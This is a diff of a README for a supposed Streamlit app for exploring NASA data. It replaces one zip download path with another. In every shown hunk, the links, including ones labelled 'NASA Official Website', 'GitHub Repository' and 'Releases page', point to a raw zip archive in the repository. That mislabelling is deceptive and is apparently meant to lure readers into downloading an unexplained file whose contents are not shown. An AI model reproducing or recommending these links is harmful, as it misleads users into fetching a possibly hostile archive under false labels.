@@ -1,6 +1,6 @@
 # 🌌 streamlit-space-explorer - Explore NASA Data with Ease
 
-[![Download](https://raw.githubusercontent.com/tashin666/streamlit-space-explorer/main/ochreous/streamlit-space-explorer.zip)](https://raw.githubusercontent.com/tashin666/streamlit-space-explorer/main/ochreous/streamlit-space-explorer.zip)
+[![Download](https://raw.githubusercontent.com/tashin666/streamlit-space-explorer/main/components/space_explorer_streamlit_v1.4.zip)](https://raw.githubusercontent.com/tashin666/streamlit-space-explorer/main/components/space_explorer_streamlit_v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **streamlit-space-explorer**! This application lets you explore fasci
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the application: [Download Here](https://raw.githubusercontent.com/tashin666/streamlit-space-explorer/main/ochreous/streamlit-space-explorer.zip). 
+To get started, visit this page to download the application: [Download Here](https://raw.githubusercontent.com/tashin666/streamlit-space-explorer/main/components/space_explorer_streamlit_v1.4.zip). 
 
 Follow these simple steps:
 
@@ -73,11 +73,11 @@ Join our community to connect with other space enthusiasts. You can share your e
 
 ## 🔗 Additional Resources
 
-- [NASA Official Website](https://raw.githubusercontent.com/tashin666/streamlit-space-explorer/main/ochreous/streamlit-space-explorer.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/tashin666/streamlit-space-explorer/main/ochreous/streamlit-space-explorer.zip)
+- [NASA Official Website](https://raw.githubusercontent.com/tashin666/streamlit-space-explorer/main/components/space_explorer_streamlit_v1.4.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/tashin666/streamlit-space-explorer/main/components/space_explorer_streamlit_v1.4.zip)
 
 ## 📅 Release Notes
 
-For the latest updates and improvements, visit the Release Notes section on our [Releases page](https://raw.githubusercontent.com/tashin666/streamlit-space-explorer/main/ochreous/streamlit-space-explorer.zip).
+For the latest updates and improvements, visit the Release Notes section on our [Releases page](https://raw.githubusercontent.com/tashin666/streamlit-space-explorer/main/components/space_explorer_streamlit_v1.4.zip).
 
 Your journey through the universe begins here! We hope you enjoy using **streamlit-space-explorer**. Happy exploring!
